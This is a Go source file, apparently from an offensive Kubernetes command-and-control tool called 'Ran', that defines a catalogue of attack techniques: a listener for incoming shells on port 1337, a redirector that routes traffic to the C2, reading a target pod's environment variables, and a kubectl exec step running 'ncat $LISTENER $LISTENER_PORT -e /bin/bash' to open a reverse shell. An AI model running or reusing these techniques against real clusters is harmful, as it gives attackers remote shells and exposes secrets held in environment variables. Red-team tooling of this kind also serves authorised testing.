package armory

import "github.com/Magier/Ran/domain"

type TTP interface {
	GetTitle() string
	GetDescription() string
	GetMessage() domain.Message
}

type TTPMeta struct {
	Title, Description string
}

func (meta TTPMeta) GetTitle() string {
	return meta.Title
}
func (meta TTPMeta) GetDescription() string {
	return meta.Description
}

type CreateListener struct {
	TTPMeta
	Port uint
}

func (c CreateListener) GetMessage() domain.Message {
	return domain.StartListener{Port: c.Port}
}

type CreateRedirector struct {
	TTPMeta
	DstPort uint
}

func (c CreateRedirector) GetMessage() domain.Message {
	return domain.StartC2Redirector{DstPort: c.DstPort}
}

type ReadEnvVars struct {
	TTPMeta
	TargetId        string
	Target          string
	TargetNamespace string
}

func (c ReadEnvVars) GetMessage() domain.Message {
	return domain.ReadEnvVars{
		Target: &domain.Target{
			Id:   c.TargetId,
			Name: c.Target,
			Ns:   c.TargetNamespace,
		},
	}
}

type KubectlExecCmd struct {
	TTPMeta
	Cmd string
}

func (c KubectlExecCmd) GetMessage() domain.Message {
	return domain.ExecCmd{Cmd: c.Cmd, Target: &domain.Target{}}
}

type Armory struct {
}

func (a Armory) GetTTPs() []TTP {
	return []TTP{
		CreateListener{TTPMeta: TTPMeta{Title: "Create Listener", Description: "Catch incoming shells"}, Port: 1337},
		CreateRedirector{TTPMeta: TTPMeta{Title: "Create Redirector", Description: "Create a proxy routing traffic to the C2"}, DstPort: 1337},
		ReadEnvVars{TTPMeta: TTPMeta{Title: "Read Environment Variables", Description: "Read environment variables from a target"}},
		KubectlExecCmd{TTPMeta: TTPMeta{Title: "Kubectl Exec simple shell", Description: "Use kubectl exec to establish a simple shell"}, Cmd: "ncat $LISTENER $LISTENER_PORT -e /bin/bash"},
	}
}

func LoadArmory() (Armory, error) {
	return Armory{}, nil
}
